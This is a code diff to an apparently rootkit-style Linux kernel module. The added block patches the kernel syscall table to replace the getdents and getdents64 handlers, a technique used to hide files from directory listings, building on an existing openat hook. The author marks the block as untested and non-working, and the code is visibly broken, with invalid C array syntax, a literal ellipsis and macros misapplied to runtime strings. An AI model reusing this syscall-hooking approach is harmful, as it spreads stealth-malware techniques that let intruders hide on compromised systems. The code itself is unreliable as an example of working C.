@@ -247,6 +247,37 @@ asmlinkage long sys_openat_do_hook(int dfd, const char __user *pathname, int fla
 	return sys_openat_orig(ARGS_ORIG(4, int, dfd, const char __user*, pathname, int, flags, umode_t, mode));
 }
 
+// TESTING ------------------------------------
+//NOT TESTED YET
+//THIS WON'T WORK
+#define sys_orig(name) sys_##name##_orig
+#define sys_hook(name) sys_##name##_hook
+#define sys_num(name) __NR_##name
+#define sys_define(name) HOOK_##name //problem: mayus
+
+int n_hooks = 2;
+char[][] hooks = {"getdents", "getdents64", ...}
+void perform_hooks(void){
+	ENABLE_WRITE();
+	for (int i = 0; i < n_hooks; i++){
+		if (!sys_define(hooks[i])) continue;
+		sys_orig(hooks[i]) = (void*)syscall_table[sys_num(hooks[i])];
+		syscall_table[sys_num(hooks[i])] = sys_hook(hooks[i]);
+	}
+	DISABLE_WRITE();
+}
+
+void disable_hooks(void){
+	ENABLE_WRITE();
+	for (int i = 0; i < n_hooks; i++){
+		if (!sys_define(hooks[i])) continue;
+		syscall_table[sys_num(hooks[i])] = sys_orig(hooks[i]);
+	}
+	DISABLE_WRITE();
+}
+// END TESTING --------------------------------
+
+
 //__init para que solo lo haga una vez y después pueda sacarlo de memoria
 int __init hooks_init(void){
 	if ((syscall_table = (void *)kallsyms_lookup_name("sys_call_table")) == 0){
